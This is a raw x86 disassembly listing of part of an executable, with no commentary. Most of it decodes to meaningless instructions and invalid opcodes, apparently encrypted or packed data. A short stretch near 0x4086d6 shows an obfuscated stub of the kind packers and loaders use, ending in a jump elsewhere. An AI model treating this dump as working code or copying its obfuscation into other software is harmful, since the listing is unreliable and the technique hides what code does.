  408153:	or     al,0x72
  408155:	and    BYTE PTR [ecx],0x34
  408158:	fild   QWORD PTR [ecx+0x276c6a95]
  40815e:	sbb    BYTE PTR [ebp-0x4c],bl
  408161:	(bad)  
  408162:	pop    esp
  408163:	aam    0xd7
  408165:	inc    ebp
  408166:	dec    esi
  408167:	retf   
  408168:	shl    ebx,cl
  40816a:	data16 loop 0x4080f1
  40816d:	pop    es
  40816e:	sbb    al,0xbf
  408170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408171:	xlat   BYTE PTR ds:[ebx]
  408172:	daa    
  408173:	add    DWORD PTR [esi+0x3a044527],ebp
  408179:	out    dx,eax
  40817a:	cmp    ebx,0xfffffffc
  40817d:	sbb    BYTE PTR ds:0xe15a9cb5,0x32
  408184:	adc    BYTE PTR [ecx],cl
  408186:	outs   dx,DWORD PTR ds:[esi]
  408187:	push   ss
  408188:	movlps QWORD PTR [ebx+0x2652ecb2],xmm5
  40818f:	sbb    DWORD PTR [edx],edx
  408191:	sbb    eax,0x2881a26f
  408196:	fsubr  QWORD PTR [ecx+esi*4]
  408199:	mov    bl,0xb6
  40819b:	push   0x1f
  40819d:	popf   
  40819e:	ins    WORD PTR es:[edi],dx
  4081a0:	xchg   edi,eax
  4081a1:	mov    cl,0x71
  4081a3:	test   BYTE PTR [ecx+0x2b],al
  4081a6:	mov    ss,WORD PTR [esi+0x58ae1dba]
  4081ac:	pop    ss
  4081ad:	inc    esi
  4081ae:	jo     0x408185
  4081b0:	nop
  4081b1:	jle    0x408190
  4081b3:	shr    DWORD PTR [esi-0x75],cl
  4081b6:	pop    ebp
  4081b7:	frstor [edx-0x4dc4a496]
  4081bd:	xchg   ecx,eax
  4081be:	or     al,0x70
  4081c0:	adc    eax,0x68932733
  4081c5:	outs   dx,BYTE PTR ds:[esi]
  4081c7:	data16 shr BYTE PTR [eax],1
  4081ca:	adc    al,0x91
  4081cc:	and    BYTE PTR [edi],bl
  4081ce:	imul   esi,edx,0x410b097d
  4081d4:	jbe    0x408180
  4081d6:	std    
  4081d7:	mov    ecx,0xd6e9c267
  4081dc:	jnp    0x408231
  4081de:	lahf   
  4081df:	jno    0x4081bd
  4081e1:	sub    ch,BYTE PTR [esi-0x61]
  4081e4:	sbb    BYTE PTR [edi+0x12],0x93
  4081e8:	mov    DWORD PTR [bx+si+0x15],edi
  4081ec:	push   es
  4081ed:	neg    edx
  4081ef:	call   0x74dace06
  4081f4:	cli    
  4081f5:	push   cs
  4081f6:	fisttp WORD PTR [ebp-0xd]
  4081f9:	imul   ebx,edi,0x43941a9
  4081ff:	mov    cl,0xbf
  408201:	retf   
  408202:	jns    0x40818a
  408204:	rcr    DWORD PTR [edx+0x5ef5fb28],1
  40820a:	jmp    0xd857:0xf5d99bb3
  408211:	rcr    BYTE PTR [edi-0x73],0xe1
  408215:	test   BYTE PTR ds:0xd581f978,dh
  40821b:	in     eax,0x78
  40821d:	jo     0x408297
  40821f:	sbb    al,0xbb
  408221:	sti    
  408222:	push   edi
  408223:	(bad)  
  408224:	fisub  WORD PTR [esi-0x2dcb2e]
  40822a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40822b:	cmp    DWORD PTR [ebx+0x1c40f160],edx
  408231:	jae    0x408269
  408233:	lds    ecx,FWORD PTR [ebp+0x20]
  408236:	dec    ebx
  408237:	loopne 0x40821f
  408239:	adc    esp,DWORD PTR [edi]
  40823b:	xchg   esp,eax
  40823c:	in     eax,0xd1
  40823e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40823f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408240:	sbb    al,0x64
  408242:	mov    ecx,edx
  408244:	sbb    al,0xc6
  408246:	pop    ebp
  408247:	cmp    ch,cl
  408249:	mov    ebx,0x77c3c041
  40824e:	pushf  
  40824f:	and    esi,DWORD PTR [ebx-0x6f]
  408252:	add    DWORD PTR [ebx-0x46],0x49
  408256:	shr    al,cl
  408258:	in     eax,0x8d
  40825a:	push   ss
  40825b:	dec    ecx
  40825c:	mov    dh,0xee
  40825e:	and    al,0x80
  408260:	popf   
  408261:	mov    bl,0x8c
  408263:	inc    ebx
  408264:	ficom  DWORD PTR [esi+0xe2c3c8]
  40826a:	and    BYTE PTR [ecx-0x4a],bh
  40826d:	mov    ds:0x13a6cc22,eax
  408272:	push   edx
  408273:	test   al,0xc1
  408275:	push   0x12
  408277:	sub    DWORD PTR [ebx+0x7],esp
  40827a:	add    cl,bl
  40827c:	pop    es
  40827d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827e:	sub    DWORD PTR [eax-0x2a70153d],edx
  408284:	xchg   ebx,eax
  408285:	xor    esi,DWORD PTR [eax-0x5e427501]
  40828b:	add    al,0x26
  40828d:	inc    ebx
  40828e:	stc    
  40828f:	mov    esi,eax
  408291:	adc    esp,DWORD PTR [eax+0x33134a02]
  408297:	mov    al,0xf8
  408299:	push   0x76
  40829b:	outs   dx,BYTE PTR ds:[esi]
  40829c:	mov    edx,0x281bc7a4
  4082a1:	imul   esp,DWORD PTR [esi+0x6a38675f],0xc9dba770
  4082ab:	cwde   
  4082ac:	sub    DWORD PTR [eax-0x11],0x69249714
  4082b3:	dec    esp
  4082b4:	fst    DWORD PTR [edx+0x58]
  4082b7:	mov    WORD PTR [edi-0x7d0848fc],gs
  4082bd:	sub    BYTE PTR [eax+0x259c84a7],0x57
  4082c4:	dec    BYTE PTR [edx+eax*8]
  4082c7:	mov    esi,0x1e6957b7
  4082cc:	sbb    DWORD PTR [ebx-0x6d310707],ebp
  4082d2:	xchg   edx,eax
  4082d3:	nop
  4082d4:	sub    bl,al
  4082d6:	dec    ecx
  4082d7:	out    dx,al
  4082d8:	test   BYTE PTR [edi+0x2f],bl
  4082db:	in     al,dx
  4082dc:	mov    ebx,0x50ed6262
  4082e1:	inc    edi
  4082e2:	scas   eax,DWORD PTR es:[edi]
  4082e3:	popf   
  4082e4:	adc    DWORD PTR [ebp-0x64],ebp
  4082e7:	es adc al,0xfc
  4082ea:	push   esp
  4082eb:	test   DWORD PTR [ebp-0x678f86cd],ebp
  4082f1:	pop    edx
  4082f2:	pop    DWORD PTR gs:[edi+0x3d30b0cc]
  4082f9:	xor    eax,0x3d6dd44
  4082fe:	pop    edx
  4082ff:	adc    eax,0x87ac9866
  408304:	cmp    BYTE PTR [edi],dh
  408306:	sub    ecx,DWORD PTR [ecx]
  408308:	test   al,0x2b
  40830a:	jo     0x4082cf
  40830c:	(bad)  
  40830d:	ss pop es
  40830f:	mov    dh,0x15
  408311:	adc    bh,bl
  408313:	rol    DWORD PTR [edx-0x49c4b95f],0x22
  40831a:	ins    DWORD PTR es:[edi],dx
  40831b:	ja     0x40836f
  40831d:	ja     0x408349
  40831f:	bound  edx,QWORD PTR [ebp+0x3e163ff8]
  408325:	mov    bh,0x5c
  408327:	aam    0xc5
  408329:	cmp    esp,DWORD PTR [ebp+0x27357d2f]
  40832f:	outs   dx,DWORD PTR ds:[esi]
  408330:	jmp    0x574d63a0
  408335:	(bad)  
  408336:	ins    BYTE PTR es:[edi],dx
  408337:	mov    ss,WORD PTR [ecx-0x755711e9]
  40833d:	bound  edx,QWORD PTR [ebx]
  40833f:	ja     0x4083a6
  408341:	and    cl,ch
  408343:	aad    0xac
  408345:	nop
  408346:	jnp    0x408355
  408348:	pushf  
  408349:	repz repnz dec ebx
  40834c:	lahf   
  40834d:	fwait
  40834e:	dec    edx
  40834f:	call   0xcd540bbf
  408354:	pop    esp
  408355:	fisttp QWORD PTR [eax+0x7239abbb]
  40835b:	pop    DWORD PTR [edi]
  40835d:	dec    eax
  40835e:	or     DWORD PTR [edi-0x16],esi
  408361:	mov    ecx,0xfc77df9f
  408366:	iret   
  408367:	push   ecx
  408368:	fbstp  TBYTE PTR [ebx]
  40836a:	sbb    BYTE PTR [ecx+0x2a],0x8a
  40836e:	(bad)  
  40836f:	jp     0x4083e7
  408371:	jns    0x40831f
  408373:	shl    cl,1
  408375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408376:	pop    ebp
  408377:	aas    
  408378:	inc    edx
  408379:	push   cs
  40837a:	inc    eax
  40837b:	and    esp,DWORD PTR [ebp+ebp*4+0x31bc56a3]
  408382:	fstp   QWORD PTR [eax+0x2081cd29]
  408388:	call   0xb3f1cb03
  40838d:	loope  0x4083c0
  40838f:	std    
  408390:	xor    cl,BYTE PTR [ebx-0x7d19056d]
  408396:	in     eax,dx
  408397:	adc    dh,0xd6
  40839a:	jmp    0xbfb6cabb
  40839f:	inc    ecx
  4083a0:	add    al,0xd8
  4083a2:	dec    ecx
  4083a3:	lea    esi,[ecx]
  4083a5:	inc    edi
  4083a6:	in     al,0x77
  4083a8:	(bad)  
  4083a9:	and    bl,ch
  4083ab:	inc    eax
  4083ac:	(bad)  
  4083ad:	rcl    DWORD PTR [edi-0xd],1
  4083b0:	xchg   edx,eax
  4083b1:	ds nop
  4083b3:	mov    ch,0xb3
  4083b5:	xor    ah,BYTE PTR [eax+0x5fe85ab3]
  4083bb:	dec    esp
  4083bc:	push   ebp
  4083bd:	into   
  4083be:	addr16 out 0x16,eax
  4083c1:	and    bl,BYTE PTR [eax+0x346e075d]
  4083c7:	mov    esp,0xfcce9c3e
  4083cc:	cli    
  4083cd:	xchg   esp,eax
  4083ce:	aas    
  4083cf:	add    al,0x46
  4083d1:	add    ebp,DWORD PTR [edi-0x2cb8fda2]
  4083d7:	out    dx,eax
  4083d8:	aam    0xab
  4083da:	outs   dx,DWORD PTR ds:[esi]
  4083db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083dc:	out    0x24,al
  4083de:	ins    BYTE PTR es:[edi],dx
  4083df:	leave  
  4083e0:	into   
  4083e1:	pop    esi
  4083e2:	cdq    
  4083e3:	dec    edi
  4083e4:	xchg   ebx,eax
  4083e5:	aam    0x86
  4083e7:	add    DWORD PTR [edi-0x37],esi
  4083ea:	cld    
  4083eb:	ins    BYTE PTR es:[edi],dx
  4083ec:	shr    esp,0x37
  4083ef:	ret    
  4083f0:	push   DWORD PTR [esi+0x49d9fb1b]
  4083f6:	int3   
  4083f7:	rcl    BYTE PTR [edx],0x59
  4083fa:	test   ebx,ebx
  4083fc:	daa    
  4083fd:	call   0x3aa955a9
  408402:	imul   BYTE PTR [ecx-0x22]
  408405:	jmp    0xdfcb49
  40840a:	mov    ch,0x46
  40840c:	lods   al,BYTE PTR ds:[esi]
  40840d:	repnz pop edi
  40840f:	mov    ds:0x97fc6364,al
  408414:	std    
  408415:	(bad)  
  408416:	jnp    0x4083d9
  408418:	mov    eax,DWORD PTR [ecx-0x785acd61]
  40841e:	fwait
  40841f:	cmp    eax,0x13521930
  408424:	mov    ebp,gs
  408426:	imul   ecx,DWORD PTR [ebx],0xffffffed
  408429:	push   0x26b80f88
  40842e:	fadd   QWORD PTR [ebp-0x40]
  408431:	xchg   BYTE PTR [esi-0x48],bl
  408434:	pop    es
  408435:	mov    BYTE PTR [esi],dl
  408437:	dec    esi
  408438:	int    0x17
  40843a:	jo     0x4083cc
  40843c:	loop   0x4083f1
  40843e:	inc    edx
  40843f:	pop    esi
  408440:	push   cs
  408441:	shl    BYTE PTR [eax-0x7d01812d],0xc3
  408448:	pop    ebp
  408449:	cmp    esi,DWORD PTR [ebp+0x6c0f813f]
  40844f:	dec    esp
  408450:	push   ebx
  408451:	ss sti 
  408453:	mov    esp,0x8d5d6e6c
  408458:	pop    esp
  408459:	aaa    
  40845a:	sbb    al,bl
  40845c:	rcr    DWORD PTR [edx],cl
  40845e:	dec    edx
  40845f:	mov    BYTE PTR [edi+0xb],al
  408462:	fwait
  408463:	pop    edx
  408464:	mov    WORD PTR [eax-0x47],es
  408467:	mul    BYTE PTR [ebx+0x3f5b0139]
  40846d:	cmp    eax,0xfca69dbf
  408472:	or     al,0xfa
  408474:	in     eax,0x7c
  408476:	or     esi,edi
  408478:	xchg   ecx,eax
  408479:	jnp    0x408435
  40847b:	push   ebx
  40847c:	sti    
  40847d:	scas   al,BYTE PTR es:[edi]
  40847e:	inc    ecx
  40847f:	shr    cl,cl
  408481:	mov    BYTE PTR [edx-0x74],ah
  408484:	gs call 0x6cdb4e7d
  40848a:	pop    ss
  40848b:	out    dx,al
  40848c:	cmp    BYTE PTR [esi],dh
  40848e:	mov    al,0xc4
  408490:	sar    ebp,0x75
  408493:	xchg   esp,eax
  408494:	mov    ch,0x4f
  408496:	inc    ebx
  408497:	add    cl,ah
  408499:	xchg   ebx,eax
  40849a:	sbb    edx,DWORD PTR [edi]
  40849c:	dec    edx
  40849d:	xchg   esi,eax
  40849e:	fidiv  WORD PTR [eax-0x2d]
  4084a1:	cmp    BYTE PTR [eax],ch
  4084a3:	jb     0x4084be
  4084a5:	dec    esp
  4084a6:	les    esi,FWORD PTR ds:0x7aa63ed5
  4084ac:	adc    ch,0x3b
  4084af:	std    
  4084b0:	outs   dx,DWORD PTR ds:[esi]
  4084b1:	out    dx,eax
  4084b2:	sbb    eax,0x87beafcf
  4084b7:	mov    esi,0x3cb10488
  4084bc:	dec    edi
  4084bd:	add    eax,0x10bc7995
  4084c2:	mov    eax,ds:0x5c3a680b
  4084c7:	sub    DWORD PTR [edx-0x35],esi
  4084ca:	push   0xffffffab
  4084cc:	mov    ecx,0x40f40b6a
  4084d1:	lea    esi,[ebx+0x566b8976]
  4084d7:	addr16 mov edx,ds
  4084da:	in     eax,0x7d
  4084dc:	or     edi,edx
  4084de:	shl    DWORD PTR [edi-0x4c8b1f72],1
  4084e4:	cmc    
  4084e5:	sub    DWORD PTR [esp+ebx*8-0x3a],ecx
  4084e9:	icebp  
  4084ea:	ror    cl,1
  4084ec:	es dec edi
  4084ee:	mov    eax,0x8336a707
  4084f3:	ja     0x40855b
  4084f5:	add    esi,DWORD PTR [eax+eax*1]
  4084f8:	push   ds
  4084f9:	cmp    BYTE PTR [ebp+0x77],ch
  4084fc:	in     eax,0xf3
  4084fe:	int    0x5e
  408500:	dec    eax
  408501:	inc    esi
  408502:	inc    esi
  408503:	test   al,0x7f
  408505:	ds push cs
  408507:	push   edi
  408508:	mov    ecx,DWORD PTR [ebp+0x43d1d827]
  40850e:	mov    dl,0xc8
  408510:	lods   al,BYTE PTR ds:[esi]
  408511:	ss mov esp,0x72076ac0
  408517:	gs inc eax
  408519:	shl    eax,cl
  40851b:	bound  eax,QWORD PTR [ebx+0x29]
  40851e:	(bad)  
  40851f:	jb     0x4084f4
  408521:	jbe    0x408506
  408523:	sbb    bl,BYTE PTR [ebp-0x25]
  408526:	ss in  al,0x97
  408529:	xchg   esi,eax
  40852a:	xchg   ecx,eax
  40852b:	xor    ebx,DWORD PTR [esi]
  40852d:	inc    ebx
  40852e:	jne    0x40859e
  408530:	fwait
  408531:	and    al,0xe3
  408533:	(bad)  
  408534:	xlat   BYTE PTR ds:[ebx]
  408535:	or     ecx,esp
  408537:	or     edx,0x38dbf20a
  40853d:	ret    0xbf93
  408540:	sahf   
  408541:	retf   
  408542:	int    0xdf
  408544:	push   ss
  408545:	mov    ds,eax
  408547:	mov    edx,0x188bde76
  40854c:	lods   eax,DWORD PTR ds:[esi]
  40854d:	call   0xc6fba09b
  408552:	imul   eax,DWORD PTR [esi+edx*2],0xffffff92
  408556:	cs in  eax,dx
  408558:	sub    BYTE PTR [ecx],bh
  40855a:	inc    eax
  40855b:	push   ecx
  40855c:	inc    esi
  40855d:	(bad)  
  40855e:	push   cs
  40855f:	or     bh,bl
  408561:	or     bl,BYTE PTR [esi+eax*2+0x969329d]
  408568:	sti    
  408569:	adc    al,0xd9
  40856b:	mov    esi,0x66bb7a4b
  408570:	xchg   ebp,eax
  408571:	pop    ebp
  408572:	gs and al,0x5b
  408575:	push   edi
  408576:	pusha  
  408577:	pushf  
  408578:	adc    dh,dl
  40857a:	jo     0x40855a
  40857c:	rol    BYTE PTR [ebx],1
  40857e:	lahf   
  40857f:	(bad)  
  408580:	fwait
  408581:	retf   
  408582:	pop    esi
  408583:	dec    ebp
  408584:	enter  0x455b,0x57
  408588:	sbb    ah,bl
  40858a:	repnz or BYTE PTR [esi],bl
  40858d:	push   eax
  40858e:	add    cl,dh
  408590:	pop    ds
  408591:	popa   
  408592:	fcmovne st,st(1)
  408594:	push   edx
  408595:	cmp    DWORD PTR [ebx+0x4b676273],0xffffff8f
  40859c:	adc    eax,0xf38e6d7e
  4085a1:	pop    eax
  4085a2:	xchg   DWORD PTR [ecx-0x3b],ecx
  4085a5:	inc    ebx
  4085a6:	popa   
  4085a7:	pop    esp
  4085a8:	test   eax,0x3235a183
  4085ad:	lahf   
  4085ae:	adc    cl,ch
  4085b0:	sbb    eax,0x54cb1c4e
  4085b5:	retf   
  4085b6:	lods   eax,DWORD PTR ds:[esi]
  4085b7:	fcomip st,st(1)
  4085b9:	and    DWORD PTR [ebx+0x7463d82a],esp
  4085bf:	ins    BYTE PTR es:[edi],dx
  4085c0:	xor    al,0x4c
  4085c2:	pop    edx
  4085c3:	dec    esi
  4085c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c5:	aas    
  4085c6:	ret    
  4085c7:	cwde   
  4085c8:	jae    0x408649
  4085ca:	push   ebp
  4085cb:	or     bh,BYTE PTR [esi]
  4085cd:	stos   DWORD PTR es:[edi],eax
  4085ce:	out    dx,eax
  4085cf:	push   eax
  4085d0:	or     BYTE PTR [edx-0x44],0xb5
  4085d4:	clts   
  4085d6:	cmp    BYTE PTR [eax+ecx*2-0x76],cl
  4085da:	mov    dl,0xbe
  4085dc:	mov    edx,0xe174fb68
  4085e1:	pop    edx
  4085e2:	add    al,0x8b
  4085e4:	je     0x40858b
  4085e6:	mov    edx,0x87b0f56a
  4085eb:	out    dx,eax
  4085ec:	into   
  4085ed:	sar    DWORD PTR [ebx+0x39],0x6d
  4085f1:	fxch   st(3)
  4085f3:	xor    BYTE PTR [ecx+0x6d],ch
  4085f6:	xchg   esi,eax
  4085f7:	repz and DWORD PTR [ecx-0x63],edx
  4085fb:	cmp    DWORD PTR [edx],esi
  4085fd:	out    0x69,al
  4085ff:	test   DWORD PTR [esi+0x46d4fe7b],esi
  408605:	and    BYTE PTR [ebx+0x2b],0xdf
  408609:	cld    
  40860a:	dec    ebp
  40860b:	jns    0x408668
  40860d:	imul   ebp,DWORD PTR [eax+0x15],0xffffffa6
  408611:	jb     0x4085a7
  408613:	dec    edi
  408614:	mov    ah,0x1f
  408616:	outs   dx,BYTE PTR ds:[esi]
  408617:	fwait
  408618:	jmp    0x583e:0x63a44a48
  40861f:	fsubr  DWORD PTR [edi+0x75]
  408622:	lahf   
  408623:	push   edi
  408624:	mov    eax,ds:0x5db10869
  408629:	xchg   ebp,eax
  40862a:	lea    ecx,[esi-0x200578f5]
  408630:	push   ds
  408631:	or     BYTE PTR [eax-0x22],ah
  408634:	stos   DWORD PTR es:[edi],eax
  408635:	mov    eax,0x85f4628e
  40863b:	jle    0x408634
  40863d:	jle    0x40861f
  40863f:	push   ss
  408640:	mov    bh,0xe8
  408642:	mov    eax,ds:0xbc8f53e7
  408647:	addr16 gs loope 0x40867a
  40864b:	pop    esp
  40864c:	mov    ecx,0xc5cfbce6
  408651:	(bad)  
  408652:	xor    al,0x7
  408654:	std    
  408655:	js     0x408661
  408657:	dec    ebx
  408658:	push   cs
  408659:	stos   BYTE PTR es:[edi],al
  40865a:	mov    ecx,0xf3a67dd6
  40865f:	xor    al,0xd5
  408661:	cli    
  408662:	inc    esi
  408663:	pop    edx
  408664:	leave  
  408665:	xchg   esp,eax
  408666:	pop    ss
  408667:	lock movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  40866a:	xor    bl,BYTE PTR [esi+esi*8]
  40866d:	sbb    eax,DWORD PTR [esi+0xa]
  408670:	xchg   ebp,eax
  408671:	mov    esi,0x856dd22f
  408676:	fistp  WORD PTR [edx]
  408678:	mov    eax,0x13be4e36
  40867d:	pop    es
  40867e:	push   es
  40867f:	in     al,0xd0
  408681:	das    
  408682:	jnp    0x40868d
  408684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408685:	mov    al,ds:0x6a64ec56
  40868a:	addr16 popa 
  40868c:	dec    esp
  40868d:	js     0x408686
  40868f:	adc    dh,BYTE PTR [ebp-0x41576b3b]
  408695:	mov    WORD PTR [ebx+0xe5bf3e1],ds
  40869b:	cld    
  40869c:	mov    cl,0x25
  40869e:	std    
  40869f:	pop    es
  4086a0:	lods   al,BYTE PTR ds:[esi]
  4086a1:	push   edx
  4086a2:	stos   BYTE PTR es:[edi],al
  4086a3:	fcmovne st,st(7)
  4086a5:	test   al,0x90
  4086a7:	scas   eax,DWORD PTR es:[edi]
  4086a8:	rcr    BYTE PTR [edx+eax*1-0x66103d0e],cl
  4086af:	xor    ecx,DWORD PTR ds:[esi-0x1e91004e]
  4086b6:	mov    DWORD PTR [eax],ecx
  4086b8:	mov    dh,0x9
  4086ba:	push   eax
  4086bb:	sbb    edi,DWORD PTR [edi-0x3a]
  4086be:	push   cs
  4086bf:	sub    edx,DWORD PTR [esi+0x56]
  4086c2:	sahf   
  4086c3:	push   ebx
  4086c4:	inc    ebx
  4086c5:	jmp    0x4086d1
  4086c7:	dec    eax
  4086c8:	icebp  
  4086c9:	jb     0x4086d9
  4086cb:	or     al,BYTE PTR [edi+ecx*4-0x15b52a8a]
  4086d2:	pop    edx
  4086d3:	push   esi
  4086d4:	out    0x3b,al
  4086d6:	jecxz  0x40871d
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xc02693b1
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	(bad)
  408722:	fistp  QWORD PTR [ecx+edi*1]
  408725:	pushf  
  408726:	add    dl,cl
  408728:	sub    al,0xb1
  40872a:	push   ebx
  40872b:	push   ecx
  40872c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40872d:	jg     0x40874d
  40872f:	leave  
  408730:	pop    ss
  408731:	cmp    DWORD PTR [edx+0x24],esi
  408734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408735:	sub    eax,0x1e1ea537
  40873a:	(bad)  
  40873b:	push   ds
  40873c:	out    dx,eax
  40873d:	sbb    edx,DWORD PTR [ebp+0x39]
  408740:	leave  
  408741:	add    DWORD PTR [edx-0x46280047],esi
  408747:	jecxz  0x4086ca
  408749:	in     eax,0x32
  40874b:	push   esi
  40874c:	add    eax,0x117094a3
  408751:	cli    
  408752:	jmp    0x7ff4df8c
  408757:	or     edi,edi
  408759:	mov    bl,cl
  40875b:	dec    ecx
  40875c:	pop    bp
  40875e:	jmp    FWORD PTR [ebp-0x5af2e86b]
  408764:	mov    al,ds:0x65820db
  408769:	in     eax,dx
  40876a:	repnz fadd DWORD PTR [esp+0xef38bba]
  408772:	lods   al,BYTE PTR ds:[esi]
  408773:	scas   eax,DWORD PTR es:[edi]
  408774:	dec    edx
  408775:	je     0x40879f
  408777:	hlt    
  408778:	out    0x5a,al
  40877a:	mov    cl,0x93
  40877c:	test   DWORD PTR [edi+0x69f896bd],edx
  408782:	(bad)  
  408783:	fild   DWORD PTR [edi]
  408785:	mov    ebx,0xb2d65420
  40878a:	jae    0x408710
  40878c:	mov    ds:0xee6554a7,al
  408791:	xchg   ecx,eax
  408792:	fidiv  WORD PTR [edi+0x70]
  408795:	into   
  408796:	das    
  408797:	sbb    al,0xe1
  408799:	xchg   ecx,eax
  40879a:	adc    DWORD PTR [ebx+esi*2-0x2d4b96a3],ecx
  4087a1:	pop    eax
  4087a2:	mov    edx,0xb51e23c
  4087a7:	jge    0x4087a8
  4087a9:	inc    ecx
  4087aa:	sub    eax,0x56a35be9
  4087af:	xor    eax,0x170128
  4087b4:	call   0xc127:0x6784be4e
  4087bb:	jmp    0xe3a:0xbb07edf6
  4087c2:	xchg   esi,eax
  4087c3:	or     eax,0xfa3377f1
  4087c8:	hlt    
  4087c9:	jecxz  0x408789
  4087cb:	push   esi
  4087cc:	xchg   esi,eax
  4087cd:	mov    BYTE PTR [ebx+0x281898a3],dh
  4087d3:	ret    
  4087d4:	stc    
  4087d5:	jmp    0x40881c
  4087d7:	sbb    bl,BYTE PTR [esi]
  4087d9:	jne    0x4087bf
  4087db:	sub    eax,0x3aa7a48d
  4087e0:	add    ch,bl
  4087e2:	jns    0x408858
  4087e4:	test   eax,0xa7443c53
  4087e9:	jmp    0x4087e9
  4087eb:	xor    ch,BYTE PTR [ebx+eiz*2-0x80]
  4087ef:	cs int 0x3
  4087f2:	ins    BYTE PTR es:[edi],dx
  4087f3:	mov    dh,0xf7
  4087f5:	push   eax
  4087f6:	mov    ah,dh
  4087f8:	add    eax,0x1635ff5a
  4087fd:	sbb    bh,BYTE PTR [ecx+esi*4]
  408800:	pop    ds
  408801:	into   
  408802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408803:	sub    DWORD PTR [eax+eiz*8-0x74],0x68
  408808:	add    ebx,edx
  40880a:	je     0x408862
  40880c:	sbb    al,0x32
  40880e:	retf   0xe69f
  408811:	and    esp,DWORD PTR [ecx+0x49ff406a]
  408817:	or     eax,0x30abefc8
  40881c:	sbb    al,0x8
  40881e:	(bad)  
  40881f:	mov    al,ds:0xf404215f
  408824:	push   ebp
  408825:	or     al,0xb9
  408827:	neg    BYTE PTR [edi+0x1311bf17]
  40882d:	fidivr WORD PTR [ecx+0x57]
  408830:	or     eax,0xcb06e2e8
  408835:	jecxz  0x4087db
  408837:	dec    edx
  408838:	and    eax,0xc833335b
  40883d:	pop    eax
  40883e:	and    ch,bl
  408840:	jl     0x40881b
  408842:	fs test al,0xf1
  408845:	sub    DWORD PTR [esi],esp
  408847:	sub    bl,BYTE PTR [esi-0x1f]
  40884a:	pop    ebp
  40884b:	pop    ebx
  40884c:	(bad)  
  40884e:	dec    edi
  40884f:	sbb    bl,ch
  408851:	sub    edx,DWORD PTR [ecx-0x7d]
  408854:	mov    ch,0xff
  408856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408857:	repnz and BYTE PTR [ebx-0x7f73bc9c],dh
  40885e:	dec    ecx
  40885f:	sub    cl,BYTE PTR [ebx]
  408861:	(bad)  
  408862:	stos   DWORD PTR es:[edi],eax
  408863:	inc    ebx
  408864:	retf   0xd2d2
  408867:	adc    eax,0xd6ea37cf
  40886c:	stos   BYTE PTR es:[edi],al
  40886d:	xchg   ecx,eax
  40886e:	add    al,0xe7
  408870:	dec    ecx
  408871:	pop    esi
  408872:	add    DWORD PTR [esi+edx*2],esi
  408875:	fbld   TBYTE PTR [ebp-0x8031b40]
  40887b:	sbb    DWORD PTR [ebp-0x62],esi
  40887e:	adc    al,0x68
  408880:	imul   esi,DWORD PTR [ebx-0x37],0xffffff96
  408884:	mov    eax,0x78891d93
  408889:	cmp    eax,0xbb27dd30
  40888e:	jmp    0x408852
  408890:	mov    bl,0x2e
  408892:	in     al,dx
  408893:	imul   eax,DWORD PTR [eax-0x571604c5],0xe068d08a
  40889d:	cld    
  40889e:	jle    0x408902
  4088a0:	popa   
  4088a1:	data16 out dx,al
  4088a3:	ds mov esi,0x2e6ccbe9
  4088a9:	in     eax,dx
  4088aa:	adc    ebp,DWORD PTR [edi+0x68647997]
  4088b0:	out    0xaf,al
  4088b2:	stos   BYTE PTR es:[edi],al
  4088b3:	dec    ebp
  4088b4:	pop    esp
  4088b5:	idiv   DWORD PTR [ebx+0x76848166]
  4088bb:	add    cl,BYTE PTR [edi+0x2801570f]
  4088c1:	jl     0x408892
  4088c3:	in     eax,0xeb
  4088c5:	and    bh,BYTE PTR [esi+0x7b67a824]
  4088cb:	cld    
  4088cc:	inc    esp
  4088cd:	dec    esp
  4088ce:	pop    esi
  4088cf:	addr16 out dx,eax
  4088d1:	ins    DWORD PTR es:[edi],dx
  4088d2:	ret    0xc282
  4088d5:	in     al,0xe4
  4088d7:	pop    ds
  4088d8:	push   ebp
  4088d9:	inc    ebp
  4088da:	loopne 0x408901
  4088dc:	ss push eax
  4088de:	sub    bl,0x7a
  4088e1:	fist   DWORD PTR [ebp+eiz*2-0x75]
  4088e5:	popa   
  4088e6:	sub    dl,dh
  4088e8:	xlat   BYTE PTR ds:[ebx]
  4088e9:	shr    dh,cl
  4088eb:	lds    edi,FWORD PTR [ecx-0x7bacfa78]
  4088f1:	sbb    eax,0xa9042a2b
  4088f6:	cli    
  4088f7:	push   esi
  4088f8:	(bad)  
  4088f9:	jnp    0x40889f
  4088fb:	sbb    ebp,edx
  4088fd:	into   
  4088fe:	push   edx
  4088ff:	(bad)  
  408900:	aad    0xc1
  408902:	call   0x798:0x57733487
  408909:	sbb    edx,eax
